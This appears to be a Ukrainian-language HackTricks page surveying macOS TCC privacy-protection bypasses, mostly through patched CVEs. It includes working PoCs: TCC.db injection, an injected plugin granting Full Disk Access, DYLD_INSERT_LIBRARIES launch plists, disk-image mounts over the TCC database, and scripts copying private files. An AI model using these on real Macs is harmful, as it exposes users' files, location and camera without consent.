# Обходи macOS TCC

{{#include ../../../../../banners/hacktricks-training.md}}

## За функціональністю

### Обхід запису

Це не обхід, а просто принцип роботи TCC: **він не захищає від запису**. Якщо Terminal **не має доступу до читання Робочого столу користувача, він усе одно може записувати в нього**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Атрибут **extended attribute `com.apple.macl`** додається до нового **file**, щоб надати **creators app** доступ до його читання.

### TCC ClickJacking

Можна **розмістити вікно поверх запиту TCC**, щоб змусити користувача **прийняти** його, не помітивши цього. PoC можна знайти в [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Атакер може **створювати apps з будь-якою назвою** (наприклад, Finder, Google Chrome...) у **`Info.plist`** і змусити їх запитувати доступ до захищеного TCC розташування. Користувач думатиме, що цей доступ запитує легітимний застосунок.\
Крім того, можна **видалити легітимний app з Dock і розмістити там fake app**, щоб після натискання користувачем на fake app (який може використовувати ту саму іконку) він міг викликати легітимний app, запитати дозволи TCC і виконати malware, змусивши користувача повірити, що доступ запросив легітимний app.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Більше інформації та PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

За замовчуванням доступ через **SSH раніше мав "Full Disk Access"**. Щоб вимкнути його, потрібно, щоб він був у списку, але вимкнений (видалення зі списку не прибере ці привілеї):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: За замовчуванням доступ через SSH раніше мав "Full Disk Access". Щоб вимкнути його, потрібно, щоб він був у списку, але вимкнений (видалення...](<../../../../../images/image (1077).png>)

Тут можна знайти приклади того, як деякі **malwares змогли обійти цей захист**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[11]](#references)</sup>

> [!CAUTION]
> Зверніть увагу, що тепер для можливості enable SSH потрібен **Full Disk Access**

### Обробка розширень - CVE-2022-26767

Атрибут **`com.apple.macl`** надається files, щоб надати **певному application дозволи на їх читання.** Цей атрибут встановлюється, коли файл **drag\&drop** на app або коли користувач **двічі клацає** файл, щоб відкрити його за допомогою **default application**.

Отже, користувач міг би **зареєструвати malicious app** для обробки всіх розширень і викликати Launch Services для **відкриття** будь-якого file (тому malicious file отримає дозвіл на читання).

### iCloud

З entitlement **`com.apple.private.icloud-account-access`** можна взаємодіяти з **`com.apple.iCloudHelper`** XPC service, який **надасть iCloud tokens**.

**iMovie** та **Garageband** мали цей entitlement та інші, які це дозволяли.

Для отримання додаткової **інформації** про exploit, що дає змогу **отримати icloud tokens** за допомогою цього entitlement, перегляньте доповідь: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[12]](#references)</sup>

### kTCCServiceAppleEvents / Automation

App із дозволом **`kTCCServiceAppleEvents`** зможе **керувати іншими Apps**. Це означає, що він зможе **зловживати дозволами, наданими іншим Apps**.

Додаткову інформацію про Apple Scripts дивіться:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Наприклад, якщо App має **Automation permission для `iTerm`**, як у цьому прикладі, **`Terminal`** має доступ до iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Для iTerm

Terminal, який не має FDA, може викликати iTerm, який його має, і використовувати його для виконання дій:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Через Finder

Або якщо App має доступ через Finder, він може виконати такий скрипт:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## За поведінкою App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Користувацький **tccd daemon** використовував змінну **`HOME`** **env**, щоб отримати доступ до бази даних користувачів TCC за адресою: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Згідно з [цією публікацією на Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), оскільки TCC daemon запускається через `launchd` у домені поточного користувача, існує можливість **контролювати всі змінні середовища**, що передаються йому.\
Таким чином, **attacker міг встановити змінну середовища `$HOME`** у **`launchctl`**, щоб вона вказувала на **контрольований** **directory**, **перезапустити** **TCC** daemon, а потім **безпосередньо змінити базу даних TCC**, надавши собі **кожен доступний TCC entitlement** без будь-якого запиту до кінцевого користувача.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes мали доступ до захищених TCC розташувань, але коли створюється нотатка, вона **створюється в незахищеному розташуванні**. Отже, можна було попросити Notes скопіювати захищений файл у нотатку (тобто в незахищене розташування), а потім отримати доступ до файлу:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Бінарний файл `/usr/libexec/lsd` із бібліотекою `libsecurity_translocate` мав entitlement `com.apple.private.nullfs_allow`, який дозволяв створювати монтування **nullfs**, а також entitlement `com.apple.private.tcc.allow` із **`kTCCServiceSystemPolicyAllFiles`** для доступу до кожного файлу.

Можна було додати атрибут quarantine до "Library", викликати XPC-сервіс **`com.apple.security.translocation`**, після чого він відображав Library у **`$TMPDIR/AppTranslocation/d/d/Library`**, де всі документи всередині Library можна було **прочитати**.

### CVE-2024-44131 - FileProvider symlink race

Застосунки, які передають файлові операції **привілейованому helper-процесу** (у цьому випадку **`fileproviderd`** / **`Files.app`**), копіюють або переміщують об'єкти **від імені користувача**, тому копіювання виконується з привілеями helper-процесу, а не викликувача.

Jamf Threat Labs показала, що перевірку symlink, яка виконується перед операцією, можна **атакувати через race condition**: замість встановлення symlink у **останньому** компоненті шляху (який перевіряється), зловмисник замінює **проміжний** каталог шляху **після початку копіювання**. Після цього привілейований helper-процес переходить за контрольованим зловмисником посиланням і читає/записує захищені TCC розташування, **ніколи не показуючи запит**.<sup>[[7]](#references)</sup>

Каталоги, які **не захищені** випадковим UUID у своєму шляху (наприклад `~/Library/Mobile Documents/com~apple~CloudDocs`), є найпростішими цілями, оскільки зловмисник може передбачити повний шлях для проведення race.

> [!TIP]
> Це загальний шаблон, який слід шукати: **будь-який привілейований процес, що розв'язує шлях більше одного разу** (перевірка з подальшим використанням або `rename()`/`copyfile()`, які окремо розв'язують source і destination), можна атакувати через race, замінивши каталог у середині шляху. Лише `O_NOFOLLOW_ANY`, `openat()` для вже відкритого directory FD або `realpath()` + повторна перевірка справді закривають це вікно.

Більше інформації у [**публікації Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[7]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` можна зібрати з `SQLITE_ENABLE_SQLLOG`, що додає logging hook, керований змінними середовища ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[8]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – для **кожної відкритої бази даних** у `path` записуються **копія файлу бази даних** і log SQL-інструкцій (каталог уже має існувати).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – створювати **нову копію щоразу**, коли DB відкривається або під'єднується, замість повторного використання наявної.
- **`SQLITE_SQLLOG_CONDITIONAL`** – logувати з'єднання лише тоді, коли поруч з основною DB існує файл `<database>-sqllog`.

Якщо вдається інжектувати цю змінну в процес, який має **FDA** і відкриває SQLite databases, він без проблем **скопіює ці захищені databases** у каталог, контрольований вами. Оскільки ім'я файлу призначення формується з даних, контрольованих зловмисником, **symlink, встановлений у місці призначення**, перетворює цю ж примітивну операцію на **довільний запис у файл** із привілеями цільового процесу.

### **SQLITE_AUTO_TRACE**

Якщо змінну середовища **`SQLITE_AUTO_TRACE`** встановлено, бібліотека **`libsqlite3.dylib`** почне **logувати** всі SQL-запити. Багато застосунків використовували цю бібліотеку, тому можна було logувати всі їхні SQLite-запити.

Декілька застосунків Apple використовували цю бібліотеку для доступу до інформації, захищеної TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Пошук записів файлів, керованих env-var

Два попередні випадки є прикладами однієї й тієї самої загальної техніки, тому варто пошукати інші: **frameworks, завантажені в TCC-привілейовані apps, часто мають debug/logging environment variables, які змушують процес створювати файл за шляхом, контрольованим caller**.

Workflow для їх пошуку:

1. Виберіть target із FDA або іншим важливим TCC-дозволом (`Music`, `TV`, `Terminal`, MDM agents...) і перегляньте frameworks, з якими він лінкується (`otool -L`, `vmmap`).
2. Виконайте grep цих frameworks для рядків `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Встановіть candidate variables через `launchctl setenv NAME /path/you/control`, запустіть app і спостерігайте за його діями у файловій системі за допомогою `fs_usage -w -f filesys <pid>` або `sudo fs_usage | grep <path>`.
4. Якщо процес **створює або перейменовує** файл у вашій директорії, ви отримали write primitive: вкажіть як destination symlink (або створіть race для проміжної директорії, як у наведеному вище CVE-2024-44131), щоб перенаправити його до `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Є два обмеження. По-перше, змінні `DYLD_*` ігноруються binaries із hardened runtime, якщо app не містить entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("булеве значення, яке вказує, чи може app зазнавати впливу environment variables динамічного linker-а, які можна використовувати для ін'єкції коду в процес app") — див. також [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). По-друге, Apple видаляє окремі debug variables frameworks після повідомлень про них, тому variable, яка працювала в одному macOS release, часто зникає в наступному. Якщо app мовчки відмовляється запускатися після її встановлення, вважайте, що ця variable вже відфільтрована.

Див. [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md), щоб ознайомитися з еквівалентною технікою з linker variables.

### Apple Remote Desktop

Як root, ви могли б увімкнути цей service, після чого **ARD agent матиме full disk access**, що користувач міг би використати для копіювання нової **TCC user database**.

## Через **NFSHomeDirectory**

TCC використовує database у папці HOME користувача для контролю доступу до ресурсів, специфічних для користувача, за адресою **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Отже, якщо користувач зможе перезапустити TCC із env variable `$HOME`, що вказує на **іншу папку**, він зможе створити нову TCC database у **/Library/Application Support/com.apple.TCC/TCC.db** і змусити TCC надати будь-який TCC-дозвіл будь-якому app.

> [!TIP]
> Зверніть увагу, що Apple використовує параметр, збережений у профілі користувача, в атрибуті **`NFSHomeDirectory`**, як **значення `$HOME`**. Тому, якщо ви скомпрометуєте application із дозволами на зміну цього значення (**`kTCCServiceSystemPolicySysAdminFiles`**), ви можете **weaponize** цю опцію за допомогою TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Перший POC** використовує [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) і [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) для зміни папки **HOME** користувача.

1. Отримайте blob _csreq_ для target app.
2. Створіть fake-файл _TCC.db_ із необхідним доступом і blob _csreq_.
3. Експортуйте запис користувача в Directory Services за допомогою [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Змініть запис у Directory Services, щоб змінити home directory користувача.
5. Імпортуйте змінений запис Directory Services за допомогою [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Зупиніть _tccd_ користувача та перезавантажте process.

У другому POC використовувався **`/usr/libexec/configd`**, який мав `com.apple.private.tcc.allow` зі значенням `kTCCServiceSystemPolicySysAdminFiles`.\
Було можливо запустити **`configd`** з опцією **`-t`**, за допомогою якої attacker міг вказати **custom Bundle для завантаження**. Отже, exploit **замінює** метод зміни home directory користувача через **`dsexport`** і **`dsimport`** на **code injection у `configd`**.

Докладніше див. [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[13]](#references)</sup>

## Через process injection

Існують різні техніки ін'єкції коду всередину process і зловживання його TCC privileges:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Крім того, найпоширеніший знайдений спосіб process injection для bypass TCC — через **plugins (load library)**.\
Plugins — це додатковий код, зазвичай у формі libraries або plist, який **завантажується головною application** і виконується в її context. Тому, якщо головна application мала доступ до файлів, обмежених TCC (через надані permissions або entitlements), **custom code також матиме цей доступ**.

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` мала entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, завантажувала plugins із розширенням **`.daplug`** і **не мала** hardened runtime.

Щоб weaponize цей CVE, **`NFSHomeDirectory`** **змінюється** (через зловживання попереднім entitlement), щоб отримати можливість **перехопити TCC database користувача** для bypass TCC.

Докладніше див. [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[14]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** мала entitlements `com.apple.security.cs.disable-library-validation` і `com.apple.private.tcc.manager`. Перша **дозволяла code injection**, а друга надавала доступ до **керування TCC**.

Цей binary дозволяв завантажувати **third party plug-ins** із папки `/Library/Audio/Plug-Ins/HAL`. Тому було можливо **завантажити plugin і зловживати TCC permissions** за допомогою цього POC:<sup>[[15]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Для отримання додаткової інформації перегляньте [**оригінальний звіт**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[15]](#references)</sup>

### Плагіни Device Abstraction Layer (DAL)

System applications, які відкривають потік камери через Core Media I/O (програми з **`kTCCServiceCamera`**), завантажують у процес ці плагіни, розташовані в `/Library/CoreMediaIO/Plug-Ins/DAL` (не обмежені SIP).

Достатньо просто зберегти там бібліотеку зі звичайним **конструктором**, щоб виконати **ін'єкцію коду**.

Кілька програм Apple були вразливими до цього.

### Firefox

Програма Firefox мала entitlements `com.apple.security.cs.disable-library-validation` і `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[16]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Для отримання додаткової інформації про те, як легко це експлуатувати, [**перегляньте оригінальний звіт**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[16]](#references)</sup>

### CVE-2020-10006

Бінарний файл `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` мав entitlements **`com.apple.private.tcc.allow`** і **`com.apple.security.get-task-allow`**, що дозволяло інжектити code усередину процесу та використовувати привілеї TCC.

### CVE-2023-26818 - Telegram

Telegram мав entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** і **`com.apple.security.cs.disable-library-validation`**, тому його можна було використати для **отримання доступу до його дозволів**, наприклад для запису за допомогою камери. Ви можете [**знайти payload у writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[17]](#references)</sup>

Зверніть увагу, що для використання env variable з метою завантаження library було створено **custom plist** для інжекту цієї library, а для її запуску використано **`launchctl`**:<sup>[[17]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## За допомогою викликів open

Можна викликати **`open`**, навіть перебуваючи в sandbox

### Terminal Scripts

Досить часто Terminal надають **Full Disk Access (FDA)**, принаймні на комп'ютерах, якими користуються технічні спеціалісти. Також за його допомогою можна викликати скрипти **`.terminal`**.

Скрипти **`.terminal`** є plist-файлами, подібними до цього, із командою для виконання в ключі **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Застосунок може записати скрипт термінала в розташування на кшталт /tmp і запустити його за допомогою команди на кшталт:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Через монтування

### CVE-2020-9771 - mount_apfs TCC bypass і підвищення привілеїв

**Будь-який користувач** (навіть непривілейований) може створити та змонтувати snapshot Time Machine і отримати **доступ до ВСІХ файлів** цього snapshot.\
**Єдина необхідна привілея** полягає в тому, що використовувана програма (наприклад, `Terminal`) повинна мати доступ **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles), який має надати адміністратор.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Більш детальне пояснення можна [**знайти в оригінальному звіті**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Навіть якщо файл TCC DB захищений, було можливо **підмонтувати поверх каталогу** новий файл TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Перегляньте **повний exploit** у [**оригінальному описі**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Як пояснюється в [оригінальному описі](https://www.kandji.io/blog/macos-audit-story-part2), ця CVE використовувала `diskarbitrationd`.<sup>[[18]](#references)</sup>

Функція `DADiskMountWithArgumentsCommon` із публічного framework `DiskArbitration` виконувала перевірки безпеки. Однак їх можна обійти, безпосередньо викликавши `diskarbitrationd`, а отже, використовуючи елементи `../` у шляху та symlinks.

Це дозволяло зловмиснику виконувати довільне монтування в будь-яке місце, зокрема поверх бази даних TCC, завдяки entitlement `com.apple.private.security.storage-exempt.heritable` процесу `diskarbitrationd`.

### asr

Інструмент **`/usr/sbin/asr`** дозволяв копіювати весь диск і монтувати його в іншому місці в обхід захистів TCC.

### CVE-2022-22655 - Служби геолокації

Служби геолокації **не зберігаються** в базі даних TCC, як інші служби. Ними керує `locationd`, який зберігає власний список дозволів у **`/var/db/locationd/clients.plist`**:<sup>[[5]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Кожен запис має ключ клієнта (bundle ID або шлях до executable) і містить такі поля, як `Authorized`, `BundleId`, `Executable` і `Registered`.

Сам файл `clients.plist` захищений Sandbox/TCC і не може бути відредагований навіть із правами root — але **каталог `/var/db/locationd/` не був захищений від монтування**. Тому зловмисник, який працював із правами root, міг створити образ диска з власним `clients.plist` (позначивши свій binary як `Authorized`), змонтувати його поверх каталогу та перезапустити `locationd`, щоб підроблений список дозволів набув чинності.<sup>[[5]](#references)</sup>

> [!TIP]
> Це та сама схема, що й у наведених вище TCC bypasses через `hdiutil`/`mount`: *файл* захищений, а *каталог, у якому він розташований*, — ні, тому замінюється весь каталог, а не файл.

## Через startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Через grep

У деяких випадках файли зберігатимуть чутливу інформацію, як-от email-адреси, номери телефонів, повідомлення... у незахищених місцях (що в Apple вважається вразливістю).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Це більше не працює, але [**раніше працювало**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Інший спосіб із використанням [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[19]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [10] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [11] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [12] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [17] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [18] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
